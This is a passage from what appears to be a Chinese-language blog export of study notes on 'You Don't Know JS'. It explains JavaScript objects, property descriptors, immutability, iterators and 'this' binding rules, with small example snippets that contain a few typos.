d:anotherFunction&#125;anotherArray.push(anotherObject,myObject); 如何准确表示 myObject 的复制呢？ 首先，我们应该判断它是浅复制还是深复制。对于浅拷贝来说，复制出的新对象中 a 的值会复制旧对象中 a 的值，也就是2，但是新对象中 b、c、d三个属性其实只是三个引用，它们和旧对象中 b、c、d引用的对象是一样的。对于深复制来说，除了复制 myObject 以外还会复制 anotherObject 和 anotherArray 。这时候问题来了，anotherArray 引用了 anotherObject 和 myObject ，所以又需要复制 myObject ，这样就会由于循环引用导致死循环。 我们是应该检测循环引用并终止循环（不复制深层元素）？还是应当直接报错或者是选择其他方法？ 除此之外，我们还不确定复制一个函数意味着什么，有些人会通过 toString 来序列化一个函数的源代码（但是结果取决于 JavaScript 的具体实现，而且不同的引擎对于不同类型的函数处理方式不一样）。那么要怎么解决这些棘手的问题？许多 JavaScript标准都提出了自己的解决办法，但是 JavaScript 应当采用哪种方法作为标准？在很长的一段时间内一直没有一个标准。 对于 JSON 安全（也就是说可以被序列化为一个 JSON 字符串并且可以根据这个字符串解析出一个结构和值完全一样的对象）的对象来说，有一种巧妙的复制方法： 1var newObj = JSON.parse(JSON.stringfy(someObj)); 当然 ，这种方法需要保证对象是 JSON 安全的，所以只使用部分情况。 相比深复制，浅复制非常易懂并且问题要少得多，所以 ES6 定义了 Object.assign(..)方法来实现浅复制。Object.assign(..)方法的第一个参数是目标对象，之后还可以跟一个或多个源对象的所有可枚举（enumerable）的自有键（owned key）并把它们复制（使用 = 操作符赋值）到目标对象，最后返回目标对象，就像这样： 12345var newObj = Object.assign(&#123;&#125;,myObject);newObj.a; // 2newObj.b === anotherObject; // truenewObj.c === anotherArray; // truenewObj.d === anotherFunction; // true 由于Object.assign(..)就是使用 = 操作符来赋值，所以源对象属性的一些特性（比如 writable）不会被复制到目标对象 属性描述符在 ES5 之前，JavaScript 语言本身并没有提供可以直接检测属性特性的方法，比如判断属性是否可读。 但是从 ES5 开始，所有属性都具备了属性描述符 思考下面的代码： 123456789101112var myObject = &#123; a:2&#125;Object.getOwnPropertyDescriptor(myObject,"a");/*&#123; value: 2, writable: true, enumerable: true, configurable: true, &#125;*/ 上面这个普通对象属性对应的属性描述符（已被称为“数据描述符”，因为它只保存了一个数据值）可不仅仅只是一个2，它还包含了另外三个特性：writable(可写)、enumerable(可枚举)、configurable(可配置) 在创建普通属性时属性描述符会使用默认值，我们也可以使用 Object.defineProperty(..)来添加一个新属性或者修改一个已有属性（如果它是 configurabel）并对特性进行设置。举个例子： 12345678var myObject = &#123;&#125;;Object.defineProperty(myObject,"a",&#123; value:2, writable: true, enumerable: true, configurable: true, &#125;);myObject.a; // 2 我们使用 defineProperty(..)给 myObject 添加了一个普通的属性并显示指定了一些特性。然后，一般来说你不会使用这种方式，除非你想修改属性描述符。 1.Writabelwritable 决定了是否可以修改属性的值，举个例子： 123456789var myObject = &#123;&#125;;Object.defineProperty(myObject,"a",&#123; value:2, writable: false, // 不可写 enumerable: true, configurable: true, &#125;);myObject.a = 3;myObject.a; // 2 可以看到我们对于属性值的修改静默失败（sliently failed），在严格模式下，这种方法还会报错。 12345678910"use strict";var myObject = &#123;&#125;;Object.defineProperty(myObject,"a",&#123; value:2, writable: false, // 不可写 enumerable: true, configurable: true, &#125;);myObject.a = 3; // TypeError TypeError 错误表示我们无法修改一个不可写的属性 可以把 writable：false 看作是属性不可改变，相当于你定义了一个空的 setter严格来说，如果要和 writable：false一致的话，你的 setter 被调用时应当抛出一个 TypeError 错误 2.Configurable只要属性是可配置的，就可以使用 defineProperty(..)方法来修改属性描述符 123456789101112131415161718192021var myObject = &#123; a:2&#125;;myObject.a = 3;myObject.a; // 3Object.defineProperty(myObject,"a",&#123; value:4, writable: true, enumerable: true, configurable: false, // 不可配置 &#125;);myObject.a; // 4myObject.a = 5;myObject.a; // 5Object.defineProperty(myObject,"a",&#123; value:6, writable: true, enumerable: true, configurable: true,&#125;); // TypeError 最后一个 defindProperty(..)会产生一个 TypeError 错误，不管是不是处于严格模式，尝试修改一个不可配置的属性描述符都会出错。把 configurable 修改成 false 是单向操作，无法撤销。 有一个例外，即便属性是 configurable：false,我们还是可以把 writable 的状态为 true 改成 false,但是无法从 false 改为 true. 除了无法修改之外，configurabel：false 还会禁止删除这个属性： 123456789101112131415161718var myObject = &#123; a:2&#125;;myObject.a; // 2delete myObject.a;myObject.a; // undefinedObject.defineProperty(myObject,"a",&#123; value:2, writable: true, enumerable: true, configurable: false, // 不可配置 &#125;);myObject.a; // 2delete myObject.a;myObject.a; // 2 最后一个语句 delete 语句（静默）失败了，因为属性是不可配置的。 在上面的例子中，delete 只用来直接删除对象的（可删除）属性，如果对象的某个属性是某个对象/函数的最后一个引用者，对这个属性执行 delete 操作之后，这个未引用的对象/函数就可以被垃圾回收。但是，不要把 delete 看做一个释放内存的工具，它就是一个删除对象属性的操作，仅此而已。 3.Enumerable 最后一个属性描述符是 enumerable，从名字可以看出，这个描述符控制的是属性是否会出现在对象的属性枚举中，比如说 for..in 循环，如果把 enumerable 设置成 false，这个属性就不会出现在枚举中，虽然仍然可以正常访问它。相对的，设置成 true 就会让他出现在枚举中。 用户定义的所有普通函数默认都是可枚举的，如果不希望某些特殊的属性出现在枚举中，就可以手动设置为 false. 不变形有时候，希望属性或者对象是不可改变的（无论是有意还是无意的），在 ES5 中可以通过很多方法来实现。 很重要的一点是，所有的方法创建的都是浅不变性，也就是说，它们只会影响目标对象和它的直接属性，如果目标对象引用了其他对象（数组、对象、函数等），其他对象的内容不受影响，仍然是可变的 123myImmutableObject.foo; // [1,2,3]myImmutableObject.foo.push(4); // [1,2,3]myImmutableObject.foo; // [1,2,3,4] 假设代码中的 myImmutableObject 已经被创建而且是不可变的，但是为了保护它的内容 myImmutableObject.foo ，你还需使用下面方法让 foo 也是不可变的。 1.对象常量结合 writable：false 和 configurable ：false 就可以创建一个真正的常量属性（不可修改、重定义或删除） 123456var myObject = &#123;&#125;;Object.defineProperty(myObject,"FAVORITE_NUMBER",&#123; value:42, writable: false, configurable: false, &#125;); 2.禁止扩展禁止一个对象添加新的属性并且保留已有的属性，可以使用 Object.preventExtensions(…) 123456var myObject = &#123; a:2&#125;;Object.preventExtensions(myObject);myObject.b = 3;myObject.b; // undefined 3.密封Object.seal(..)会创建一个“密封”的对象。这个方法实际上会在一个现有对象上调用 Object.preventExtensions(..)并把所有现有属性标记为 configurable：false. 所以，密封之后不仅不能添加属性，也不能重新配置或者删除现有的属性（虽然可以修改属性的值） 4.冻结Object.freeze(..) 会创建一个冻结对象，这个方法实际上会在一个现有对象上调用 Object.seal(..)把所有数据访问属性标记为 writable：false.这样就无法修改它们的值了。 这个方法是你可以应用在对象上的级别最高的不可变性，它会禁止对于对象本身及其任意直接属性的修改（不过这个对象引用的其他对象是不受影响的） [[Get]]属性访问在实现时有一个微妙却非常重要的细节： 1234var myObject = &#123; a:2&#125;;myObject.a; // 2 myObject.a 是一次属性访问，但是这条语句不仅仅是在 myObject 中查找名字为 a 的属性，在语言规范中，myObject.a 在 myObject 实际上是实现了 [[Get]] 操作（有点像函数调用： [[Get]]（））。对象默认的内置 [[Get]] 操作首先在对象中查找是否有名称相同的属性，如果找到就会返回这个属性的值。 然后，如果没有的话，按照 [[Get]]算法的定义会执行另外一种非常重要的行为，后面会讲到（其实就是变量可能存在的 [[Prototype]]链，也就是原型链） 但是无论如何都没有找到名称相同的属性，那么 [[Get]] 属性就会返回 undefined。一种方法和访问变量时是不一样的，如果你引用了一个当前词法作用域中不存在的变量，并不会像对象属性一样返回 undefined ，而是会抛出一个 ReferenceError 异常： 12345var myObject = &#123; a:undefined &#125;;myObject.a; // undefined myObject.b; // undefined 从返回值的角度来看，这两个引用没有什么区别——它们都返回了 undefined,实际上底层的 [[Get]]操作对 myObject.b 进行了更复杂的处理，仅通过返回值，无法判断一个属性是存在并且持有一个 undefined 值，还是变量不存在，所以 [[Get]] 无法返回某个特定值而返回默认的 undefined ，后面会将如何区分。 [[Put]]既然有可以获取属性值的 [[Get]] 就有一定对应的 [[Put]] 操作。 可能会认为给对象的属性赋值会触发 [[Put]] 来设置或者创建这个属性，但是实际情况并不完全 是这样的。 [[Put]]被触发时，实际的行为取决于许多因素，包括对象中是否已经存在这个属性（这是最重要的因素）； 如果已经存在这个属性， [[Put]] 算法大致会检查下面这些内容。 属性是否是访问描述符，如果是并且存在 setter 就调用 setter 属性的数据描述符中 writable 是否是 false,如果是，在非严格模式下静默失败，在严格模式下抛出 TypeError 异常 如果都不是，将该值设置为属性的值 如果对象中不存在这个属性， [[Put]] 操作会更加复杂，后面会说到。 Getter 和 Setter对象默认的 [[Put]] 和 [[Get]] 操作分别可以控制属性值的设置和获取 在 ES5 中可以使用 getter 和 setter 部分改写默认操作，但是只能应用在单个属性上，无法应用在整个对象上。getter 是一个隐藏函数，会在获取属性值时调用。setter 也是一个隐藏函数，会在设置属性值时调用。 当给一个属性定义getter、setter 或者两者都有时，整个属性会被定义为 ”访问描述符“（和”数据描述符“相对）。对于访问描述符来说，JavaScript 会忽略它们的 value 和 writable 特性，取而代之的是关心 set 和 get （还有 configurable 和 enumerable）特性. 123456789101112131415var myObject = &#123; // 给 a 定义一个 getter get a()&#123; return 2; &#125;&#125;Object.defineProperty(myObject/*目标对象*/,"b"/*属性名*/，&#123; // 给 b 设置一个 getter get:function()&#123;return this.a * 2&#125;, // 确保 b 会出现在对象属性列表中 enumerable:true&#125;)myObject.a; // 2myObject.b; // 4 不管是对象文字语法中的 get a(){…}还是 defineProperty(..) 中的显式定义，二者都会在对象中创建一个不会包含值的属性，对于整个属性的访问会自动调用一个隐藏函数，它的返回值会被当做属性访问的返回值： 12345678var myObject = &#123; // 给 a 定义一个 getter get a()&#123; return 2; &#125;&#125;myObject.a = 3;myObject.a; // 2 由于我们只定义了 a 的 getter,所以对 a 的值进行设置时 set 操作会忽略赋值操作，不会抛出错误。而且即便有合法的 setter,由于我们定义的 getter 只会返回 2，所以 set 操作是没有意义的。 为了让属性更加合理，还应该定义 setter,和期望的一样，setter 会覆盖单个属性默认的 [[Put]] （也称为赋值）操作。通常来说，getter 和 setter 是成对出现的（只定义一个的话通常会产生意料之外的行为）： 1234567891011var myObject = &#123; // 给 a 定义一个 getter get a()&#123; return this._a_; &#125;, set a(val)&#123; this._a_ = val*2; &#125;, &#125;myObject.a = 2;myObject.a; // 4 上例中，实际把赋值（[[Put]]）操作中的值2存储到了另一个变量_a_中，这个名称的命名方式是一个惯例，没有任何特殊的行为——和普通属性一样。 存在性前面说到，myObject.a 的属性访问返回值可能是 undefined ，但是这个值有可能是属性中存储的 undefined ，也可能是因为属性不存在所以返回 undefined ，那么如何区分这两种情况？ 我们可以在不访问属性值的情况下判断对象是否存在这个属性： 12345678var myObject = &#123; a:2 &#125;;("a" in myObject); // true ("b" in myObject); // false myObject.hasOwnProperty("a"); // true myObject.hasOwnProperty("b"); // false in 操作符会检查属性是否在对象及其 [[Prototype]]原型链中。相比之下，hasOwnProperty（..）只会检查属性是否在 myObject 对象中，不会检查 [[Prototype]] 链。 所有的普通对象都可以通过对 Object.prototype 的委托来访问 hasOwnProperty(..)，但是有的对象可能没有连接到 Object.prototype(通过 Object.create(null) 来创建的)。在这种情况下，hasOwnProperty函数就可能会失败 这时候可以使用一种更加强硬的方法来判断：Object.prototype.hasOwnProperty.call(myObject,”a”);直接显示绑定。 in 操作符可以检测容器内是否有某个值。但是它实际上检查的是某个属性名是否存在。对于数组来说，这个区别很重要，4 in [2,4,6] 的结果是 false,因为这个数组中包含的属性名没有4. 1.枚举12345678910111213141516171819var myObject = &#123;&#125;Object.defineProperty(myObject/*目标对象*/,"a"/*属性名*/，&#123; value:2, // 让 a 像普通属性一样可以枚举 enumerable:true&#125;)Object.defineProperty(myObject/*目标对象*/,"b"/*属性名*/，&#123; value:3, // 让 a 不可枚举 enumerable:false&#125;)myObject.b; // 3("b" in myObject); // true myObject.hasOwnProperty("b"); // true for(var k in myObject)&#123; console.log(k,myObject[k]);&#125;// "a" 2 可以看到，myObject.b 确实有值，可是不会出现 for … in 循环中，原因就是 “可枚举” 相当于 “可以出现在对象属性的遍历中” 也可以通过另外一种方式来区分属性是否可以枚举： 12345678910111213141516var myObject = &#123;&#125;Object.defineProperty(myObject/*目标对象*/,"a"/*属性名*/，&#123; value:2, // 让 a 像普通属性一样可以枚举 enumerable:true&#125;)Object.defineProperty(myObject/*目标对象*/,"b"/*属性名*/，&#123; value:3, // 让 a 不可枚举 enumerable:false&#125;)myObject.propertyIsEnumerable("a"); // truemyObject.propertyIsEnumerable("b"); // falseObject.keys(myObject); // ["a"]Object.getOwnPropertyNames(myObject); // ["a","b"] propertyIsEnumerable(..) 会检查给定的属性名是否直接存在于对象中（而不是原型链上）并且满足 enumerable：true. Object.keys(..) 会返回一个数组，包含所有可枚举的属性，Object.getOwnPropertyNames(..) 会返回一个数组，包含所有属性，无论是否可枚举。 in 和 hasOwnProperty 函数的区别在于是否查找 [[Prototype]]链，然后，Object.keys(…)和 getOwnPropertyNames(..) 都只会查找对象直接包含的属性。 并没有内置的方法可以获取 in 操作符使用 的属性列表，不过可以递归遍历某个对象的整条[[Prototype]] 链并保存每一层中使用 Object.keys(…)得到的属性列表——只包含可枚举属性。 遍历对于数值索引的数组，可以使用标准的 for 循环来遍历值： 12345var myArray = [1,2,3];for(var i = 0; i &lt; myArray.length; i++)&#123; console.log(myArray[i]);&#125;// 1 2 3 这实际上并不是在遍历值，而是遍历下标来指向值，如 myArray[i]。 ES5 中增加了一些数组的辅助迭代器，包括 forEach(..)、every(..)和some(..)。每种辅助迭代器都可以接受一个回调函数并把它应用到数组的每个元素上，唯一的区别就是它们对于回调函数的返回值的处理方式不同。 forEach(..)会遍历数组中所有值并忽略回调函数的返回值。every(..)会一直运行直到回调函数返回 false(或者 “假”值)，some(..)会一直运行直到回调函数返回 true(或者 ‘真“值) every 和 some 中特殊的返回值和普通 for 循环中的 break 语句类似，它们会提前终止遍历。 使用 for..in 遍历对象是无法直接获取属性值的，因为它实际上遍历的是对象中所有可枚举的属性。 ES6 中增加一种用来遍历数组的 for..of 循环语法，可以直接遍历值而不是下标： 1234567var myArray = [1,2,3];for(var v of myArray)&#123; console.log(v);&#125;// 1 // 2 // 3 for..of 循环首先会想被访问对象请求一个迭代器对象，然后通过调用迭代器对象的 next() 方法来遍历所有返回值。 数组有内置的 @@iterator,因此 for..of 可以直接应用在 数组上，我们使用内置的 @@iterator来手动遍历数组： 123456var myArray = [1,2,3];var it = myArray[Symbol.iterator]();it.next(); // &#123;value:1, done:false&#125;it.next(); // &#123;value:2, done:false&#125;it.next(); // &#123;value:3, done:false&#125;it.next(); // &#123;done:true&#125; 我们使用 ES6 的符号 Symbol.iterator 来获取对象的 @@iterator内部属性。引用类似 iterator 的特殊属性时要使用符号名，而不是符号包含的值。此外，虽然看起来很像一个对象，但是 @@iterator本身并不是一个迭代器对象，而是一个迭代器对象的函数——这点很精妙并且非常重要 和数组不同，普通的对象并没有内置的@@iterator，所以无法自动完成 for..of 遍历。之所以这样，简单来说是为了避免影响未来的对象类型。 当然，可以个任何想遍历的对象定义 @@iterator ，举个例子： 1234567891011121314151617181920212223242526272829303132333435var myObject = &#123; a:2, b:3&#125;Object.defineProperty(myObject,Symbol.iterator,&#123; enumerable:false, writable:false, configurable:true, value:function()&#123; var o = this; var idx = 0; var ks = Object.keys(o); return&#123; next:function()&#123; return&#123; value:o[ks[idx++]], done:(idx &gt; ks.length) &#125; &#125; &#125; &#125;&#125;);// 手动遍历 myObjectvar it = myObject[Symbol.iterator]();console.log(it.next()); // &#123;value: 2, done: false&#125;console.log(it.next()); // &#123;value: 3, done: false&#125;console.log(it.next()); // &#123;value: undefined, done: true&#125;// 用 for...of 遍历 myObjectfor(var v of myObject)&#123; console.log(v);&#125;// 2// 3 这里使用 Object.defineProperty(…) 定义了我们自己的 @@iterator(主要是为了让它不可枚举)，不过注意。我们把符号当做可计算属性名。此外，也可以直接在定义对象时进行声明，比如：var myObject = {a:2,b:3,[Symbol.iterator:function(){/ .. /}]} for .. of 循环每次调用 myObject 迭代器对象的 next 方法时，内部的指针都会向前移动并返回对象属性类别下一个值。 代码中的遍历非常简单，只是传递了属性本身的值，也可以在自定义数据结构上实现各种复杂的遍历，对于用户定义的对象来说，结合 for..of 循环和自定义迭代器可以组成非常强大的对象操作工具。 比如说：一个 Pixel 对象（有x 和 y 坐标值）列表可以按照距离原点的直线距离来决定遍历顺序，也可以过滤掉太远的点，只要迭代器的 next() 调用会返回 {value:…} 和 {done:true} ，ES6 中的 for…of 就可以遍历它。 实际上，甚至可以定义个无限迭代器，它永远不会结束并且总会返回一个新值（比如随机数、递增值、唯一标识符等等），你永远不会在 for..of 循环中使用这样的迭代器，因为它永远不会结束，你的程序会被挂起： 123456789101112131415161718var randoms = &#123; [Symbol.iterator]:function()&#123; return &#123; next:function()&#123; return&#123; value:Math.random(); &#125; &#125; &#125; &#125;&#125;var randoms_pool = [];for(var n of randoms)&#123; randoms_pool.push(n); // 以防止无限运行！ if(randoms_pool.length === 100) break;&#125; 这个迭代器会生成“无限个”随机数，因为我们添加了一个 break 语句，防止程序被挂起。 小结JavaScript 中的对象有字面形式（var a = {}）和构造形式（var a = new Array(…)）。字面形式更常用，不过有时构造形式可以提供更多选项。 很多人都认为 “JavaScript 中万物都是对象”，这是错误的，对象是6个（或者7个）基础类型之一。对象有包括 function 在内的子类型，不同 子类型具有不同的行为，比如内部标签 [Object Array] 表示这是对象的子类型数组。 对象就是键/值对的集合，可以通过 .propName 或者 [“propName”] 语法来获取属性值。访问属性时，引擎实际上会调用内部的默认 [[Get]] 操作（在设置属性值是 [[Put]]），[[Get]] 操作符会检查对象本省是否包含这个属性，如果没有找到的话还是会查找 [[Prototype]]链。 属性的特性可以通过属性描述符来控制，比如 writable 和 configurable ，此外，可以使用 Object.preventExtensions(..)、Object.seal(..) 和 Object.freeze(..) 来设置对象（及其属性）的不可变性界别。 属性不一定包含值——它们可能是具备 getter/setter 的”访问描述符“。此外，属性可以是可枚举或者不可枚举的，这决定了它们是否会出现在 for .. in 循环中。 可以使用 ES6 的 for..of 语法来遍历对象数据结构（数组、对象等等）中的值，for..of 会寻找内置或者自定义的 @@iterator 对象并调用它的 next() 方法来遍历数据值。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>你不知道的JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你不知道的JavaScript(上)——this 和原型对象]]></title>
    <url>%2F2019-01-18-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94this%E5%92%8C%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1.html</url>
    <content type="text"><![CDATA[这个系列的作品是上一次当当网有活动买的，记得是上一年九月份开学季的时候了。后面一直有其他的事情，或者自身一些因素，迟迟没有开封这本书。今天立下一个 flag，希望可以在两个月内看完并记录这个系列的三本书，保持学习的激情，不断弥补自己的基础不够扎实的缺点。 作者的github 书籍的购买链接，自己搜。 你不知道的JavaScript(上)——this 和原型对象关于this为什么要用 this123456789101112131415161718function identify()&#123; return this.name.toUpperCase();&#125;function speak()&#123; var greeting = `Hello, I am $&#123;identify.call(this)&#125;`; console.log(greeting);&#125;var me = &#123; name:'Kyle'&#125;var you = &#123; name:'Reader'&#125;identify.call(me); // KYLEidentify.call(you); // Readerspeak.call(me); // Hello,I am KYLEspeak.call(you); // Hello,I am READER 这段代码可以在不同上下文对象（me 和 you）中重复使用函数 identify 和 speak ，不用针对每个对象编写不同的函数。 如果不使用 this,那么就需要给这两个函数显式传入一个上下文对象。 123456789function identify(context)&#123; return context.toUpperCase();&#125;function speak(context)&#123; var greeting = `Hello, I am $&#123;identify(context)&#125;`; console.log(greeting);&#125;identify(you); // READERspeak(me);// hello,I am KYLE 然而，this 提供了一种更优雅的方式隐式传递一个对象引用，因为可以将 API 设计得更加简洁并且易于复用。随着使用模式的复杂程序提高，显式传递上下文对象会让代码变得越来越混乱，使用 this 则不会这样。 误解有两种常见于 对于 this 的解释，但是它们都是错误的。 指向自身人们很容易把 this 理解成指向函数本省，这个推断从英语的语法角度是说得通的。那么为什么需要从函数内部引用函数自身呢？常见的原因是递归（从函数内部调用这个函数）或者可以写一个在第一次被调用后自己解除绑定的事件处理器。 记录 foo 被调用的次数，思考下面的代码。 1234567891011121314151617function foo(num)&#123; console.log("foo:"+num); // 记录foo 被调用的次数 this.count++;&#125;foo.count = 0;var i;for(i = 0; i &lt; 10; i++)&#123; if(i &gt; 5)&#123; foo(i) &#125;&#125;// foo:6// foo:7// foo:8// foo:9console.log(foo.count); // 0 为什么？ console.log 语句产生了 4条输出，证明 foo(..)确实是被调用了4次，但是 foo.count 的值仍然是0，显然从字面意思来理解 this 是错误的。上面这段代码其实在无意之中，会创建一个全局的 count 变量，它的值为 NaN。 可能有些人会通过创建另一个带有 count 属性的对象。 12345678910111213141516171819function foo(num)&#123; console.log("foo:"+num); // 记录foo 被调用的次数 data.count++;&#125;var data = &#123; count:0&#125;var i;for(i = 0; i &lt; 10; i++)&#123; if(i &gt; 5)&#123; foo(i) &#125;&#125;// foo:6// foo:7// foo:8// foo:9console.log(foo.count); // 4 从某个角度这确实解决了问题，但可惜忽略了真正的问题，无法理解 this 的含义和工作原理，而是使用了更熟悉的词法作用域技术。 如果要从函数 对象内部引用它本身，那只使用 this 是不够的，一般来说，需要通过一个指向函数对象的词法标识符（变量）来引用它。 思考下面的函数： 123456function foo()&#123; foo.count = 4; // foo 指向它本身&#125;setTimeout(function()&#123; // 匿名函数无法指向本身（没有名字）&#125;,10); 第一函数叫做具名函数，在它内部可以使用 foo 来引用自身。但是在第二个例子中，传入 setTimeout(..)的回调函数没有名称标识符（这种函数被称为匿名函数），因此无法从函数内部引用本身。 还有一种传统但是现在已经被弃用和批判的用法，使用 arguments.callee 来引用当前正在运行的函数对象。这是唯一一种可以从匿名函数对象内部引用自身的方法。然而更好的方法是避免使用匿名函数，至少在需要自引用时使用具名函数（表达式）。argumentss.callee 已经被弃用，尽量不要使用它 所以，另一种解决 方法是使用 foo 标识符替代 this 来引用函数对象。 1234567891011121314151617function foo(num)&#123; console.log("foo:"+num); // 记录foo 被调用的次数 foo.count++;&#125;foo.count = 0;var i;for(i = 0; i &lt; 10; i++)&#123; if(i &gt; 5)&#123; foo(i) &#125;&#125;// foo:6// foo:7// foo:8// foo:9console.log(foo.count); // 0 为什么？ 然而，这种方法同样回避了 this 的问题，并且完全依赖于变量 foo 的词法作用域。 另一种方法是强制 this 指向 foo 函数对象： 123456789101112131415161718function foo(num)&#123; console.log("foo:"+num); // 记录foo 被调用的次数 this.count++;&#125;foo.count = 0;var i;for(i = 0; i &lt; 10; i++)&#123; if(i &gt; 5)&#123; // 使用 call(..)确保 this 指向函数对象的本身 foo.call(foo,i) &#125;&#125;// foo:6// foo:7// foo:8// foo:9console.log(foo.count); // 0 为什么？ 它的作用域第二种常见的误解是，this 指向函数的作用域，这个观点是片面的，在某种情况下是正确的。 需要明确的是，this 在任何情况下都不指向函数词法作用域，在 JavaScript 内部，作用域确实和对象很类似，可见的标识符都是它的属性。但是作用域“对象”无法通过 JavaScript 代码访问，它存于 JavaScript 引擎内部。 思考下面的代码，它试图（但是没有成功）跨越便捷，使用 this 来隐式引用 函数的词法作用域： 12345678function foo()&#123; var a = 2; this.bar();&#125;function bar()&#123; console.log(this.a);&#125;foo(); // ReferenceError: a is not defined 首先这段代码试图通过 this.bar() 来引用 bar 函数，这样调用成功纯属意外、调用 bar() 最自然的方式是忽略前面的 this,直接使用词法引用标识符。此外，这段代码还尝试使用 this 联通 foo 和 bar 两个函数的词法作用域，从而让 bar 函数可以访问 foo 作用域的变量 a,这是不可能实现的，使用 this 不可能在词法作用域中查到什么。 this 到底是什么？排除了一些错误的理解后，我们说过 this 是在运行时绑定的，并不是编写时绑定的，它的上下文取决于函数调用时的各种条件，this 的绑定和函数的声明位置没有任何关系，只取决于函数的调用方式。 当一个函数被调用时，会创建一个活动记录（也被称为执行上下文）。这个记录会包含函数在哪里被调用（调用栈）、函数的调用方式、传入的参数等信息。this 就是这个记录的一个属性，会在函数执行的过程中用到。 小结学习 this 的第一步是明白 this 既不指向函数自身也不指向函数的词法作用域，抛开以前的错误的假设和理解。this 实际上是在函数被调用时发生绑定的，它指向什么完全取决于函数在哪里被调用。 this 的全面解析调用位置在理解 this 的绑定过程之前，首先要理解调用位置：调用位置就是函数在代码中被调用的位置（而不是声明的位置）。只有仔细分析调用位置才可以回答这个问题：这个 this 到底引用的是什么？ 通常来说，寻找调用位置就是寻找“函数被调用的位置”，但是做起来并没有那么简单，因为某些编程模式可能会隐藏真正的调用位置。 最重要的是分析调用栈（就是为了达到当前执行位置所调用的所有函数）。我们关心的调用位置就在当前正在执行的函数的前一个调用中。 下面看看调用栈和调用位置： 123456789101112131415161718function baz()&#123; // 当前调用栈是:baz // 因此，当前调用位置是全局作用域 console.log("baz"); bar();&#125;function bar()&#123; // 当前调用栈是:baz -&gt; bar // 因此，当前调用在 baz 中 console.log("bar"); foo();&#125;function foo()&#123; // 当前调用栈是:baz -&gt; bar -&gt; foo // 因此，当前调用在 bar 中 console.log("foo"); &#125; baz(); // baz 的调用位置 注意上面是如何（从调用栈中）分析出真正的调用位置，因为它决定了 this 的绑定。 绑定规则找到调用位置后，判断需要应用下面的四条规则中的哪一条。 默认绑定最常用的函数调用类型：独立函数调用。可以把这条规则看做是无法应用其他规则时的默认规则。 思考下面的代码： 12345function foo()&#123; console.log(this.a);&#125;var a = 2;foo(); // 2 声明在全局作用域中的变量就是全局对象的一个同名属性，它们本质上就是同一个东西，并不是通过复制得到的，就像一个硬币的两面一样。 当调用 foo() 的时候，this.a 被解析成了全局对象a，因为在本例中，函数调用时应用了 this 的默认绑定，因此 this 指向了全局对象。可以通过分析调用位置来看看 foo 是如何调用的。在代码中，foo 是直接使用不带任何修饰符的函数引用进行调用的，因此因此只能使用默认绑定，无法应用在其他规则。 如果使用严格模式（strict mode）,则不能将全局对象用于默认绑定，因此 this 会绑定到 undefined: 123456function foo()&#123; "use strict" console.log(this.a);&#125;var a = 2;foo(); // TypeError: this is undefined 这里有一个微妙重要的细节，虽然 this 的绑定规则完全取决于调用位置，但是只有 foo 运行在非 严格模式下时，默认绑定才能绑定到全局对象，在严格模式下调用 foo 则不影响默认绑定： 12345678function foo()&#123; console.log(this.a);&#125;var a = 2;(function()&#123; "use strict"; foo(); // 2&#125;)(); 隐式绑定另一条需要考虑的是调用位置是否有上下文对象，或者说是否被某个对象拥有或包含，不过这种说法可能会造成一些误导。 思考下面的代码： 12345678function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2, foo:foo&#125;;obj.foo(); // 2 需要注意的是 foo 的声明方式，及其之后是如何被当做引用属性添加到 obj 中的。但是无论是直接在 obj 中定义还是先定义再添加为引用属性，这个函数严格来说都不属于 obj 对象。然后，调用位置会使用 obj 的上下文来引用函数，因此可以说函数被调用时 foo 对象拥有或者包含函数引用。 当foo 被调用时，它的前面确实添加了对 obj 的引用。当函数引用有上下文对象时，隐式绑定规则会在函数调用中的 this 绑定到这个上下文对象。因为调用 foo 时 this 被绑定到 obj,因为 this.a 和 obj.a 是一样的。 对象属性引用链中只有一层或者说最后一层在调用位置中起到了作用。举例说： 123456789101112function foo()&#123; console.log(this.a);&#125;var obj2 = &#123; a:42, foo:foo&#125;;var obj = &#123; a:2, foo:foo&#125;;obj1.obj2.foo(); // 42 隐式丢失 一个常见的 this 绑定问题就是被隐式绑定的函数会丢失绑定对象，也就说说它会应用默认绑定，从而把 this 绑定到全局对象或者 undefined 上，取决于是否是严格模式。 思考下面的代码： 12345678910function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2, foo:foo&#125;;var bar = obj.foo; // 函数别名var a = "oops, global"; // a 是全局对象的属性bar(); // oops, global 虽然 bar 是 obj.foo 的一个引用，但是实际上，它引用的是 foo 函数本身，因此此时的 bar() 其实是一个不带任何修饰的函数调用，因此应用了默认绑定。 一种更微妙，更常见并且更出乎意料的情况发生在传入回调函数时： 12345678910111213function foo()&#123; console.log(this.a);&#125;function doFoo(fn)&#123; // fn 其实引用的是 foo fn(); // 调用位置&#125;var obj = &#123; a:2, foo:foo&#125;;var a = "oops, global"; // a 是全局对象的属性doFoo(obj.foo); // oops, global 参数传递其实就是一种隐式赋值，因此我们传入函数时也会被隐式赋值，所以结果和上一个例子一样。如果把函数传入语言内置的函数而不是传入自己声明的函数，会发生什么呢？结果是一样的，没有区别： 1234567891011121314function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2, foo:foo&#125;;var bar = obj.foo; // 函数别名setTimeout(obj.foo,100);// oops, global// js 环境中内置的 setTimeout函数实现和下面的伪代码相似function setTimeout(fn,delay)&#123; // 等待 delay 秒 fn(); // 调用位置&#125; 回调函数丢失 this 绑定是非常常见的。除此之外，还有一种情况 this 的行为会出乎我们的意料：调用回调函数的函数可能会修改 this,在一些流行的库中事件处理器会把回调函数 的 this 强制绑定在触发事件的 DOM 元素上。这在一些情况下可能有用。 无论是哪种情况，this 的改变都是意想不到的。实际上你无法控制回调函数的执行方式，因此就没有办法控制调用位置以得到期望的绑定。后面会用固定 this 来修复这个问题。 显式绑定在分析隐式绑定时，我们必须在一个对象内部包含一个指向函数的属性，并通过这个属性间接引用函数，从而把 this 间接（隐式）绑定到这个对象上。 那如果我们不想在对象内部包含函数引用，而想在某个对象上强制调用函数，该怎么做呢? JavaScript 中的所有函数都有一些可用的特性（和它们的[[Prototype]] 有关），可以解决这个问题。具体的说，可以用 call(..) 和 apply(..) 方法。严格来说，JavaScript 